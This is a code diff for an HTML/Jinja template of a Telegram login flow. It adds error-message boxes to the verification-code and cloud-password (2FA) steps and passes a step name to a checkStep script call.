@@ -41,6 +41,14 @@
                 Code sent to {{ phone }}<br>
                 Enter the code from Telegram
             </div>
+            {% if error %}
+            <div id="errorBox" class="alert alert-danger" role="alert">
+                <i class="bi bi-exclamation-triangle me-2"></i>
+                {{ error }}
+            </div>
+            {% else %}
+            <div id="errorBox" class="alert alert-danger d-none" role="alert"></div>
+            {% endif %}
             <form method="POST" class="needs-validation" novalidate>
                 <div class="form-floating mb-3">
                     <input type="text" class="form-control" id="code" name="code" 
@@ -55,7 +63,7 @@
                 </button>
             </form>
             <script>
-                checkStep("{{ phone }}");
+                checkStep("{{ phone }}", "code");
             </script>
             
             {% elif step == 'password' %}
@@ -63,6 +71,14 @@
                 <i class="bi bi-key me-2"></i>
                 Enter your Cloud Password (2FA)
             </div>
+            {% if error %}
+            <div id="errorBox" class="alert alert-danger" role="alert">
+                <i class="bi bi-exclamation-triangle me-2"></i>
+                {{ error }}
+            </div>
+            {% else %}
+            <div id="errorBox" class="alert alert-danger d-none" role="alert"></div>
+            {% endif %}
             <form method="POST" class="needs-validation" novalidate>
                 <div class="form-floating mb-3">
                     <input type="password" class="form-control" id="password" name="password" 
@@ -76,6 +92,9 @@
                     Confirm Password
                 </button>
             </form>
+            <script>
+                checkStep("{{ phone }}", "password");
+            </script>
             
             {% elif step == 'success' %}
             <div class="alert alert-success" role="alert">
